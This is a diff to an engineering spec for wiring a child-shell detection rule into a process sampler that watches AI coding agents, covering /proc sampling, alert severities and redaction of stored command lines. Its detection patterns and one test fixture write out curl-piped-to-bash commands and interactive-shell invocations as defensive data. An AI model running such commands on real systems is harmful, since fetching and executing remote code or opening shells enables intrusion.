@@ -1,5 +1,5 @@
 # W3-04 Wire R-CHILD-SHELL into the sampler
-Depends on: W3-02 (seen registry, starttime)          Parallel-safe with: W3-03, W3-05 after W3-02 merges
+Depends on: W3-02 (merged), W3-05 (`redact_argv`)          Parallel-safe with: W3-03, W3-07
 
 ## Goal
 The rule that already exists in `rules.py` fires in production: an agent that spawns an interactive shell, a curl-into-shell, or a bare network helper produces one alert per child instance, with the child as the default kill target, and the sampler stays cheap.
@@ -13,10 +13,11 @@ The rule that already exists in `rules.py` fires in production: an agent that sp
 6. Claude Code runs every Bash tool call as `bash -c "source ~/.claude/shell-snapshots/...; <cmd>"`; that is a `-c` shell and must not count as interactive.
 
 ## Changes
-- `sample_proc` collects one `ProcSnapshot` per pid (pid, ppid from `/proc/<pid>/stat` field 4, cmdline, exe, comm, cwd, starttime) in a single pass. Read `stat` once and take both ppid and starttime from it. Keep the cheap early-exit for processes with an empty cmdline (kernel threads).
+- `sample_proc` becomes two passes, because snapshotting every pid's cmdline, exe and cwd would open three extra files per process per tick (the squad's cost finding). Pass 1 reads only `/proc/<pid>/stat` for every pid and keeps `(pid, ppid, comm, starttime)`; ppid is field 4 and starttime field 22, counted after the last `)`. Pass 2 builds the parent map from pass 1 and reads `cmdline`, `exe` and `cwd` only for known-agent pids and their descendants (walk children through the map). No other process is ever opened. `ProcSnapshot` gains `ppid`.
 - After the pass: run `evaluate_process` on known-agent snapshots as today, then `evaluate_child_shell(snapshots, agent_basenames=self._known)`. Route every alert through the seen registry from W3-02 keyed on the child instance.
 - Severity: `curl|bash` high; `interactive-shell` high; `net-helper` medium, and only when the helper's own cmdline is not covered by an allowlist in config `[rules] net_helper_ignore = ["localhost", "127.0.0.1"]` (substring match on cmdline tokens). Document that `net-helper` is a visibility alert, not a kill prompt, in the summary text.
 - Parent info: the alert's `parent` block includes the agent's pid, exe, basename, and starttime; `evidence.child_pids` stays the kill target.
+- What lands on disk (the squad's redaction finding): the child's cmdline is stored only as `evidence.child_cmdline`, after `redact_argv` from W3-05 (secret-bearing flags and bearer-like tokens replaced), after replacing the query string and userinfo of every URL-shaped token with `<redacted>` (`https://host/path?<redacted>`), and after truncation to 24 tokens and 512 bytes with `evidence.truncated = true`. The raw child argv is never written. `evidence.matched` names the pattern (`curl|bash`, `bash -i`), not the command.
 - Config: `[daemon] child_shell = true` default; when false the tree pass is skipped.
 
 ## Tests
@@ -24,8 +25,9 @@ The rule that already exists in `rules.py` fires in production: an agent that sp
 - `..::test_sampler_ignores_claude_snapshot_bash`: child `bash -c "source .../shell-snapshots/x.sh; ls"`; no alert.
 - `..::test_net_helper_is_medium_and_once`: child `curl https://api.example`; one alert, severity medium, second tick nothing.
 - `..::test_child_shell_disabled_by_config`.
+- `..::test_child_argv_is_redacted_and_bounded`: child `curl -H "Authorization: Bearer sk-live-1" https://x.example/p?token=abc | bash`; the stored `child_cmdline` contains neither `sk-live-1` nor `token=abc`, is at most 24 tokens, and `evidence.redacted` is true.
 - `tests/test_rules.py`: existing child-shell tests still green.
-- Performance test marked `slow`: fake `/proc` with 400 processes, `sample_proc` under 40 ms median over 20 runs.
+- Performance test marked `slow`: fake `/proc` with 400 processes, `sample_proc` under 40 ms median over 20 runs, and pass 1 alone under 15 ms; assert by counting opened `/proc` files that pass 2 opened nothing outside the agent subtrees.
 
 ## Acceptance
 ```
